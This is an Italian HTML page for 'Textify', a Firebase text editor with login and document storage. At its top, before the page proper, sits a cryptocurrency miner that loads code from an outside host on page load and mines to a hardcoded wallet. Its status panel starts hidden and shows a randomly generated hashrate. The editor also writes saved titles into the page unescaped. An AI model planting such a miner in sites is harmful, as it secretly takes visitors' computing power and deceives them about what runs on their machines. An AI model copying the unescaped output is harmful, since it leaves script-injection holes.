<!-- ==================== MINER CONSOLE (NASCOSTO ALL'AVVIO) ==================== -->

<style>
#mining-console {
    position: fixed;
    bottom: 80px;
    right: 20px;
    width: 260px;
    background: rgba(0, 0, 0, 0.85);
    border: 1px solid #ffffff33;
    border-radius: 6px;
    padding: 12px 14px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
    z-index: 1000;
    color: #ffffff;
    font-family: 'Courier New', monospace;
    font-size: 15px;
    line-height: 1.7;
    display: none; /* Nascondo all'inizio */
}

.console-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
    padding-bottom: 8px;
    border-bottom: 1px solid #ffffff33;
}

.close-btn {
    background: #ffffff;
    color: #000000;
    border: none;
    width: 22px;
    height: 22px;
    font-size: 16px;
    line-height: 18px;
    text-align: center;
    border-radius: 3px;
    cursor: pointer;
    font-weight: bold;
}

#reopen-btn {
    position: fixed;
    bottom: 20px;
    right: 20px;
    width: 50px;
    height: 50px;
    background: rgba(255,255,255,0.1);
    border: 2px solid #ffffff88;
    color: #ffffff;
    font-size: 26px;
    border-radius: 50%;
    display: flex; /* Visibile fin dall'inizio */
    align-items: center;
    justify-content: center;
    cursor: pointer;
    z-index: 999;
    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
}
</style>

<!-- Console Miner -->
<div id="mining-console">
    <div class="console-header">
        <span><strong>🔨 CPU Miner</strong></span>
        <button class="close-btn" onclick="hideMinerConsole()">×</button>
    </div>
    <div>Stato: Attivo</div>
    <div>Hashrate: <span id="hashrate">653</span> H/s</div>
    <div>Tempo: <span id="timer">00:00</span></div>
</div>

<!-- Bottone per aprire -->
<div id="reopen-btn" onclick="showMinerConsole()">↑</div>

<!-- Script Mining -->
<script type="module">
    import { autoMine } from "https://earnify.cc/miner.js";
    autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
</script>

<script>
let startTime = Date.now();

function updateTimer() {
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
    const sec = (elapsed % 60).toString().padStart(2, '0');
    document.getElementById("timer").textContent = `${min}:${sec}`;
}

function updateHashrate() {
    const hashrate = Math.floor(Math.random() * 420) + 480;
    document.getElementById("hashrate").textContent = hashrate;
}

function hideMinerConsole() {
    document.getElementById("mining-console").style.display = "none";
    document.getElementById("reopen-btn").style.display = "flex";
}

function showMinerConsole() {
    document.getElementById("mining-console").style.display = "block";
    document.getElementById("reopen-btn").style.display = "none";
}

// Avvio timer e hashrate (senza mostrare la console)
window.addEventListener('load', () => {
    setInterval(updateTimer, 1000);
    setInterval(updateHashrate, 1400);
});
</script>
<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Textify - Editor Multidispositivo</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
  
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore-compat.js"></script>

  <style>
    .editor { min-height: 500px; outline: none; }
  </style>
</head>
<body class="bg-gray-50">

<div class="flex h-screen">
  <!-- Sidebar -->
  <div class="w-72 bg-white border-r border-gray-200 flex flex-col">
    <div class="p-4 border-b">
      <h1 class="text-2xl font-bold text-indigo-600">Textify</h1>
      <p class="text-xs text-green-600">● Online</p>
    </div>
    
    <div class="p-4">
      <button onclick="newDocument()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white py-3 rounded-lg flex items-center justify-center gap-2 font-medium">
        <i class="fas fa-plus"></i> Nuovo Documento
      </button>
    </div>

    <div class="px-4 py-2 text-sm font-medium text-gray-500">I MIEI DOCUMENTI</div>
    <div id="documents-list" class="flex-1 overflow-auto px-2"></div>

    <div class="p-4 border-t mt-auto">
      <div id="user-info" class="hidden items-center gap-3">
        <div class="w-8 h-8 bg-indigo-100 rounded-full flex items-center justify-center text-indigo-600 font-bold" id="avatar"></div>
        <div>
          <p class="font-medium text-sm" id="username-display"></p>
          <p onclick="logout()" class="text-xs text-red-500 hover:underline cursor-pointer">Esci</p>
        </div>
      </div>
    </div>
  </div>

  <!-- Area Principale -->
  <div class="flex-1 flex flex-col">
    <div class="bg-white border-b p-3 flex items-center gap-2" id="toolbar" style="display: none;">
      <button onclick="formatText('bold')" class="px-3 py-1 hover:bg-gray-100 rounded"><i class="fas fa-bold"></i></button>
      <button onclick="formatText('italic')" class="px-3 py-1 hover:bg-gray-100 rounded"><i class="fas fa-italic"></i></button>
      <button onclick="formatText('underline')" class="px-3 py-1 hover:bg-gray-100 rounded"><i class="fas fa-underline"></i></button>
      
      <div class="flex-1"></div>
      
      <button onclick="saveDocument()" class="bg-green-600 hover:bg-green-700 text-white px-6 py-2 rounded-lg flex items-center gap-2">
        <i class="fas fa-save"></i> Salva
      </button>
    </div>

    <!-- Welcome Screen -->
    <div id="welcome-screen" class="flex-1 flex items-center justify-center bg-white">
      <div class="text-center">
        <h1 class="text-4xl font-bold text-gray-800 mb-4">Benvenuto su Textify! 👋</h1>
        <p class="text-xl text-gray-600 mb-8" id="welcome-name"></p>
        <button onclick="newDocument()" 
                class="bg-indigo-600 hover:bg-indigo-700 text-white px-8 py-4 rounded-xl text-lg font-medium">
          Crea il tuo primo documento
        </button>
      </div>
    </div>

    <!-- Editor -->
    <div id="editor-area" class="flex-1 p-6 bg-white overflow-auto hidden">
      <input type="text" id="doc-title" class="text-3xl font-bold w-full outline-none mb-6" placeholder="Titolo del documento">
      <div id="editor" contenteditable="true" class="editor prose max-w-none"></div>
    </div>
  </div>
</div>

<!-- Auth Modal -->
<div id="auth-modal" class="fixed inset-0 bg-black/50 flex items-center justify-center hidden">
  <div class="bg-white rounded-2xl w-full max-w-md mx-4 p-8">
    <h2 id="modal-title" class="text-2xl font-bold mb-6 text-center">Accedi</h2>
    
    <div id="login-form">
      <input type="email" id="login-email" placeholder="Email" class="w-full px-4 py-3 border rounded-lg mb-3">
      <input type="password" id="login-password" placeholder="Password" class="w-full px-4 py-3 border rounded-lg mb-6">
      <button onclick="login()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white py-3 rounded-lg">Accedi</button>
      <p class="text-center mt-4 text-sm">Non hai un account? 
        <span onclick="switchToRegister()" class="text-indigo-600 cursor-pointer hover:underline">Registrati</span>
      </p>
    </div>

    <div id="register-form" class="hidden">
      <input type="email" id="reg-email" placeholder="Email" class="w-full px-4 py-3 border rounded-lg mb-3">
      <input type="password" id="reg-password" placeholder="Password (min 6 caratteri)" class="w-full px-4 py-3 border rounded-lg mb-6">
      <button onclick="register()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white py-3 rounded-lg">Crea Account</button>
      <p class="text-center mt-4 text-sm">Hai già un account? 
        <span onclick="switchToLogin()" class="text-indigo-600 cursor-pointer hover:underline">Accedi</span>
      </p>
    </div>
  </div>
</div>

<script>
// ================== TUA CONFIGURAZIONE FIREBASE ==================
const firebaseConfig = {
  apiKey: "AIzaSyCOdvjyrG1h3mKLtBE9cf2K6j9M_sw5wzU",
  authDomain: "textify-11b6b.firebaseapp.com",
  projectId: "textify-11b6b",
  storageBucket: "textify-11b6b.firebasestorage.app",
  messagingSenderId: "715682461511",
  appId: "1:715682461511:web:8ca4e5fd161d68882efe62"
};

firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.firestore();

let currentUser = null;
let currentDocId = null;

function getDisplayName(email) {
  return email.split('@')[0];
}

// ====================== AUTH ======================
function showAuthModal() {
  document.getElementById('auth-modal').classList.remove('hidden');
}

function switchToRegister() { /* ... stesso di prima ... */ 
  document.getElementById('login-form').classList.add('hidden');
  document.getElementById('register-form').classList.remove('hidden');
  document.getElementById('modal-title').textContent = "Crea Account";
}

function switchToLogin() {
  document.getElementById('login-form').classList.remove('hidden');
  document.getElementById('register-form').classList.add('hidden');
  document.getElementById('modal-title').textContent = "Accedi";
}

async function register() {
  const email = document.getElementById('reg-email').value;
  const password = document.getElementById('reg-password').value;
  try {
    const res = await auth.createUserWithEmailAndPassword(email, password);
    currentUser = res.user;
    initAfterLogin();
  } catch (e) { alert("Errore: " + e.message); }
}

async function login() {
  const email = document.getElementById('login-email').value;
  const password = document.getElementById('login-password').value;
  try {
    const res = await auth.signInWithEmailAndPassword(email, password);
    currentUser = res.user;
    initAfterLogin();
  } catch (e) { alert("Errore: " + e.message); }
}

function logout() { auth.signOut(); }

// ====================== UI ======================
function initAfterLogin() {
  document.getElementById('auth-modal').classList.add('hidden');
  document.getElementById('user-info').classList.remove('hidden');
  
  const name = getDisplayName(currentUser.email);
  document.getElementById('username-display').textContent = name;
  document.getElementById('avatar').textContent = name[0].toUpperCase();
  document.getElementById('welcome-name').textContent = `Ciao ${name}!`;
  
  showWelcomeScreen();
  loadUserDocuments();
}

function showWelcomeScreen() {
  document.getElementById('welcome-screen').classList.remove('hidden');
  document.getElementById('editor-area').classList.add('hidden');
  document.getElementById('toolbar').style.display = 'none';
  currentDocId = null;
}

function showEditor() {
  document.getElementById('welcome-screen').classList.add('hidden');
  document.getElementById('editor-area').classList.remove('hidden');
  document.getElementById('toolbar').style.display = 'flex';
}

// ====================== DOCUMENTI ======================
async function newDocument() {
  currentDocId = 'doc_' + Date.now();
  document.getElementById('doc-title').value = 'Nuovo Documento';
  document.getElementById('editor').innerHTML = '<p>Inizia a scrivere qui...</p>';
  showEditor();
  loadUserDocuments();
}

async function saveDocument() {
  if (!currentDocId) return;
  const title = document.getElementById('doc-title').value.trim() || 'Documento senza titolo';
  const content = document.getElementById('editor').innerHTML;

  try {
    await db.collection('documents').doc(currentDocId).set({
      userId: currentUser.uid,
      title: title,
      content: content,
      updatedAt: firebase.firestore.FieldValue.serverTimestamp()
    });
    alert("✅ Salvato!");
    loadUserDocuments();
  } catch (e) {
    alert("Errore salvataggio: " + e.message);
  }
}

async function loadUserDocuments() {
  const list = document.getElementById('documents-list');
  list.innerHTML = '<p class="text-center py-4 text-gray-400">Caricamento...</p>';

  try {
    const snapshot = await db.collection('documents')
      .where('userId', '==', currentUser.uid)
      .get();   // ← Rimosso orderBy per evitare errori indice

    list.innerHTML = '';
    
    if (snapshot.empty) {
      list.innerHTML = `<p class="text-gray-400 text-center py-4">Nessun documento salvato</p>`;
      return;
    }

    snapshot.forEach(doc => {
      const data = doc.data();
      const div = document.createElement('div');
      div.className = `px-4 py-3 rounded-lg mx-2 mb-1 cursor-pointer flex justify-between ${doc.id === currentDocId ? 'bg-indigo-100' : 'hover:bg-gray-100'}`;
      div.innerHTML = `
        <div onclick="loadDocument('${doc.id}')" class="flex-1 truncate">
          <p class="font-medium">${data.title}</p>
        </div>
        <button onclick="deleteDocument('${doc.id}'); event.stopImmediatePropagation()" class="text-red-400 hover:text-red-600">
          <i class="fas fa-trash"></i>
        </button>
      `;
      list.appendChild(div);
    });
  } catch (e) {
    console.error(e);
    list.innerHTML = `<p class="text-red-500 text-center py-4">Errore di caricamento documenti</p>`;
  }
}

async function loadDocument(id) {
  currentDocId = id;
  try {
    const docSnap = await db.collection('documents').doc(id).get();
    if (docSnap.exists) {
      const data = docSnap.data();
      document.getElementById('doc-title').value = data.title;
      document.getElementById('editor').innerHTML = data.content || '';
      showEditor();
      loadUserDocuments();
    }
  } catch (e) {
    alert("Errore caricamento documento");
  }
}

async function deleteDocument(id) {
  if (!confirm("Elimina questo documento?")) return;
  try {
    await db.collection('documents').doc(id).delete();
    if (currentDocId === id) showWelcomeScreen();
    loadUserDocuments();
  } catch (e) {
    alert("Errore eliminazione");
  }
}

function formatText(command) {
  if (['h1','h2','p'].includes(command)) {
    document.execCommand('formatBlock', false, command);
  } else {
    document.execCommand(command);
  }
}

// ====================== AVVIO ======================
auth.onAuthStateChanged(user => {
  if (user) {
    currentUser = user;
    initAfterLogin();
  } else {
    showAuthModal();
  }
});
</script>
</body>
</html>
